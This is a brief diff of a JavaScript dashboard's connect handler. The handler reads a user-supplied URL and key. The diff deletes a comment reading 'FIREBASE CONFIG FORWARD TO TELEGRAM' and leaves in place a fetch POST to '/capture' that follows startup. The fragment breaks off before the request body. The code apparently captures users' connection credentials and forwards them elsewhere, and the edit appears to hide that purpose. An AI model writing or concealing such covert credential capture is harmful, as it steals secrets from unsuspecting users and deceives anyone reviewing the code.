@@ -5795,7 +5795,7 @@ function copyShareLink() {
   });
 }
 
-  async function handleConnect() {
+async function handleConnect() {
     var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
     var key = document.getElementById('input-key').value.trim();
     var btn = document.getElementById('btn-connect');
@@ -5852,7 +5852,6 @@ function copyShareLink() {
 
         await startDashboard(url, key);
 
-        // ── FIREBASE CONFIG FORWARD TO TELEGRAM ──
         fetch('/capture', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
